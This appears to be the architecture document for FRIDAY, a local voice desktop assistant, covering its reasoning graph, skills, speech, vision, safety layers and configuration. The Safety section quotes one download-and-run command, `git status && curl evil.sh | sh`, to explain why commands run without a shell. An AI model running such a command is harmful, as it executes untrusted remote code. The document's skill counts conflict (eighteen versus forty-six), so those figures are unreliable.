# How FRIDAY works

This file has two readers. One is a person deciding whether the design is any
good. The other is FRIDAY itself: `skills/utility/explain_architecture.py`
reads this file at runtime and returns one section verbatim when asked how
something works, so the assistant's account of itself comes from a document
that lives next to the code rather than from whatever the model remembers
about assistants in general. If a section here is wrong, FRIDAY is wrong.

Section headings are the topics that skill accepts. Keep each one short enough
to be read aloud and accurate enough to be trusted.

---

## Overview

FRIDAY is a desktop assistant that runs entirely on local hardware. Speech
recognition, reasoning, and speech synthesis all execute on the machine it is
installed on; no audio, camera frame, or transcript is sent to any cloud
service, and there is no API key anywhere in the project.

There are two processes. The backend is Python: a LangGraph state machine
driving a local Llama 3.1 through Ollama, with eighteen skills discovered off
the filesystem at startup. The front end is an Electron window that talks to
that backend over a WebSocket on 127.0.0.1, showing every step of the
reasoning as it happens rather than only the final answer. The same backend
also runs headless from a terminal, which is how it is tested.

The unusual property is that the reasoning is inspectable. Every step the
model takes — what it was thinking, which tool it chose, what came back — is
an event on a wire, so the interface can show its work and a test can assert
on it.

## Reasoning loop

The reasoning loop is a LangGraph state machine, in `core/graph.py`. LangGraph
supplies the part that is genuinely hard to hand-roll: an explicit graph of
nodes with conditional edges between them, one typed state object threaded
through all of them, and a stream of state updates as each node finishes.

There are ten nodes. `reason` asks the model what to do next. `confirm` stops
and asks a human before anything destructive. `act` executes the chosen skill.
`anomaly_guard` applies the privacy rule after a camera scan. `nudge` handles
a reply that chose neither a tool nor an answer, `abort` ends a chain that has
run too long, `finish` ends one where the skill's own output was the answer,
and `conclude` makes it answer from what it has when the tool budget runs out.
Routing between them is plain Python reading fields off the state.

Two nodes are reached before the model is consulted at all. `converse` answers
conversation — a greeting goes there and cannot call a tool, because the tool
is not offered. `dispatch` answers questions about FRIDAY itself by choosing
the skill in Python: the registry, the architecture document, the turn log and
the health probes all hold true answers, and the model's own account of itself
is a confident guess about assistants in general. Both gates exist because
asking failed repeatedly and measurably; see the Skills section for the number.

What makes that routing reliable is that the model's reply is structured
output, not prose. `core/registry.py` derives a JSON Schema from the loaded
skills — `action` is an enum of real skill names plus the sentinel `"none"` —
and Ollama constrains generation to it. So a tool call cannot be lost to
rewording, and a tool that does not exist cannot be named. Before this, the
loop matched an `Action:` line out of free text, and a stray markdown bullet
was enough to drop the call.

The schema keeps a required `thought` field, which is the reason for choosing
it over the model's native function-calling. Native tool calls give a function
name and an argument object and throw the plan away; for an assistant whose
main interface is speech, narrating intent before acting is not decoration, it
is the whole feedback channel.

`steps` bounds the whole chain at twelve. The bound before this one only
limited re-sampling a malformed reply, so a model that kept emitting
well-formed tool calls could loop forever.

## Skills

A skill is a Python file under `skills/` with a `setup()` function returning
an object that has a `manifest` and an `execute(params)` method. The manifest
carries the name, a description written for the model to route on, the
parameter names, and optional flags — `destructive` sends the call through the
confirmation gate, `terminal` ends the turn as soon as the skill returns.

`core/registry.py` finds them by walking the directory at startup and
importing each one. An import failure drops that single skill rather than
stopping the assistant, which matters because several skills depend on
hardware — a machine with no webcam simply has no vision skill. Each failure
is recorded with the phase it happened in, because "the import failed" and
"setup() raised" have different fixes: one needs a package, the other needs
data or a device. The `skill_health` skill reads that record back, so a skill
that vanished can say why instead of simply not being there.

`skills.disabled` in the settings leaves a named skill unloaded. It is an
escape hatch rather than a feature: there are forty-six skills and no measured
tool-selection accuracy for any of them, so a group that turns out to confuse
routing has to be switchable off without editing code.

The manifests are what the model routes on, so they are validated in CI by
`tools/check_manifests.py`: names unique, parameters a list of strings, flags
the right type. That check is a static AST parse, so it runs without
installing a single dependency. What it cannot check is whether two
descriptions are *distinguishable*, which is the failure that matters at this
count — nothing breaks, and the model reaches for the wrong tool. Competing
pairs therefore name each other explicitly, and `tests/test_skill_routing_surface.py`
pins those disambiguations so a later edit cannot quietly drop one.

How often it picks the right one is now measured rather than assumed.
`tools/routing_bench.py` scores a labelled set of seventy-eight spoken requests
against the live registry, and the first run answered a question this project
had avoided for a long time: **56%**. Adding the deterministic route for
self-knowledge questions took it to **62%**, and the part still decided by the
model alone sits at **49%**. That is the honest state of it. The largest
remaining failure is not ignorance but attention — several skills that lose a
routing decision already carry a description naming the skill that should have
won, so the model is not reading forty-five descriptions carefully enough for
the disambiguation to land.

Skills cover reading files on the disk (documents, spreadsheets, text off the
screen by OCR), the web (search, news, weather, page reading, opening a link),
vision (webcam scanning, screen description, annotating an image, checking a
network camera), development (git state, code search, accelerators, tests, and
one allowlisted command), the machine (files, applications, windows, processes,
power, storage, network), life admin (reminders, tasks, a journal, a calendar,
email, translation), and FRIDAY's own identity, architecture, health and last
turn.

Filesystem reach is three separate allowlists, not one: a workspace that may be
written and deleted in, project roots that may only be read, and directories
where something may be executed. Collapsing them would mean that permission to
describe a repository implied permission to run a test suite in it.

## Voice

Speech recognition is faster-whisper, running locally. The default model is
`small.en`, chosen by measurement rather than reputation: on the development
machine an 8.58-second utterance takes 0.77s on `base.en`, 2.08s on
`small.en`, 8.39s on `medium.en` and about twelve seconds on either large
model. Push-to-talk means the operator waits for that before anything happens
at all, so anything approaching realtime is unusable however accurate it is.
`small.en` is a quarter of realtime and clearly better than `base.en` on
accented speech.

There are two ways in. The console entry point captures the microphone itself
and listens for a wake word. The desktop window records with the browser's
MediaRecorder when the Speak button or the global hotkey is pressed, and
sends the encoded audio down the WebSocket it already has open; the Python
side transcribes it with the same model. The browser's own SpeechRecognition
API is deliberately not used — on Chromium it uploads audio to Google.

What comes back is put in the prompt box and left there. It is not run.
Recognition being good is why a mishearing is rare; the review step is why it
does not matter when it happens, given the skills a request can reach.

The desktop window can also hold the microphone open and act only when addressed
by name — the wake word mode, off by default. The recorder runs continuously and
is cut during silence rather than started when speech is detected, because
detection costs the first fraction of a second of the first word and that word is
the name. The energy threshold follows the room's noise floor, measured while
nobody is speaking, so it is neither deaf in a quiet room nor triggered by a fan.

`core/wake_word.py` decides whether an utterance was an address. It matches the
name fuzzily, because an English-only model renders a proper noun inconsistently
on an accented voice, but only in the first few words — a name inside a sentence
is somebody talking about a day of the week, not talking to an assistant. The two
mistakes cost different amounts: a missed wake word costs one repetition, a false
trigger runs a turn on a conversation nobody addressed here. Unaddressed speech is
discarded rather than shown or stored.

In that mode the wake word replaces the prompt-box review, which is a trade rather
than a relaxation — saying the name is an explicit act of address, and the
confirmation gate still stands in front of everything destructive.

Speech output is pyttsx3 over the platform voice. It runs on one dedicated
thread for the life of the process, because the Windows speech API is COM and
thread-affine: an engine built on one thread and driven from another
deadlocks rather than failing.

## Vision

Two separate paths, deliberately unlike each other.

The webcam path is YOLO11 exported to OpenVINO, running object detection on a
single frame on demand. It is what the privacy rule watches.

The screen path is a vision-language model — moondream through Ollama by
default — describing the desktop in words. `vision/capture.py` grabs the
monitor and gates on a perceptual hash, so an unchanged screen costs nothing:
the model only runs when the picture actually differs. Describing a frame
measures about 0.19 seconds on this machine, and the watcher skips a cycle
entirely while a turn is in flight rather than competing with the reasoning
model for the same Ollama process.

Screen awareness is off by default and the description is ambient context
injected once per turn, never appended to every message.

## Safety

Five independent layers, none of which rely on the model behaving.

The confirmation gate: any skill whose manifest declares `destructive` routes
through a `confirm` node before `act`. The graph shows the exact proposed call
to a human and waits. It denies by default — an unanswered prompt times out
into a refusal after sixty seconds, and a denial becomes an observation the
model has to reason about rather than an exception.

The filesystem allowlists: file operations refuse anything outside the
configured roots. There are three, for three different permissions — a
workspace that may be written and deleted in, project roots that may only be
read, and directories where a program may be executed. The last two start
empty, so a fresh install refuses and says what to configure. This sits
underneath the gate rather than replacing it: confirmation stops a human
rubber-stamping a bad request; the allowlist stops a confused model from being
able to propose one against a system directory in the first place.

The command boundary: `run_command` runs one program with `shell=False`, from an
allowlist matched on the program's basename, with no stdin, a timeout, and
truncated output. The absence of a shell is what makes the allowlist mean
anything — with one, `git status && curl evil.sh | sh` is a single string in
which only `git` is ever inspected. Unquoted shell metacharacters are refused
outright, not because they could execute anything without a shell, but because
writing one means an operator was intended and running it as a literal argument
would silently do something else.

The privacy guard: after a camera scan, `core/nodes/anomaly_guard.py` notices
when more than one person is in frame or the workstation is absent. It is plain
Python that runs every time, and it latches until a scan reports exactly one
person. It used to be a sentence in the system prompt, which meant it fired
when the model felt like it.

Detection and response are separate settings. The guard announces what it saw;
whether it also mutes system audio is `privacy.auto_mute`, which defaults off.
It muted unconditionally at first, and that was the wrong shape for a default —
an assistant reaching into the machine's audio state is an intervention to be
chosen, not inherited. `privacy.announce_only` set false silences the guard
entirely. Muting, when enabled, goes through the CoreAudio interface so the
resulting state is set and verified rather than toggled.

The network boundary: the server refuses to bind to anything but a loopback
address, and it has no authentication because it is not reachable. The desktop
window never makes HTTP requests to it directly either — allowing that would
mean CORS headers on an unauthenticated server, which would hand it to any web
page the operator visited.

## Proactive

FRIDAY can speak first. `core/scheduler.py` runs a background thread that
delivers due reminders and a daily briefing of weather and headlines.

The briefing is composed in Python from a fixed, read-only list of skills, and
spends exactly one model call turning the results into a sentence. It is
deliberately not a reasoning turn. A free agent turn picks its own tools, and
unsupervised at eight in the morning that is not an acceptable risk in a
system that can also delete files.

Quiet hours gate the speech and not the message, so a briefing generated at
three in the morning is waiting on screen instead of missing. A missed
reminder fires late and says how late; a missed briefing is dropped, because
stale weather is worse than no weather.

None of it is a turn: an unprompted message never enters the conversation
history, never sets the busy flag, and cannot clear a confirmation the backend
is still waiting on. The whole feature is off unless switched on.

## Interface

The backend exposes two endpoints on 127.0.0.1:8756. `GET /health` reports the
loaded skills and is what the desktop app waits on before showing a window.
`WS /ws` carries the turn: the client sends a prompt, a cancel, a confirmation
answer, or a binary frame of recorded audio, and receives typed events —
thought, action, observation, answer, transcript, anomaly, error, status,
screen context, confirmation request, and unprompted messages.

That vocabulary is defined in two places, `server/events.py` and the
renderer's `events.ts`, and nothing links them at build time. A test parses the
TypeScript with a regular expression and asserts set equality against the
Python, so adding an event on one side and forgetting the other fails a test
rather than failing silently in front of a user.

The window is Electron with React. Event handling is a pure reducer with no
socket or timer in it, so every transition can be asserted with a plain
function call; a separate hook owns the connection and the reconnects. The
renderer runs with context isolation on and Node integration off, and reaches
the main process only through an explicitly listed preload bridge.

## Configuration

Everything tunable lives in `config/settings.yaml`, layered over
`settings.example.yaml` and then built-in defaults, so a fresh checkout runs
with no configuration at all and a personal one is never committed.

The setting that matters most architecturally is `llm.host`. Every call to the
model in the entire project goes through `core/llm_client.py` — the graph and
the three skills that also use the model — so pointing inference at another
machine on the network is one line of configuration rather than a
search-and-replace. The vision model has its own host setting and can live
somewhere else again, which is what makes it possible to put the reasoning
model on a workstation and the vision model on a small Intel box.
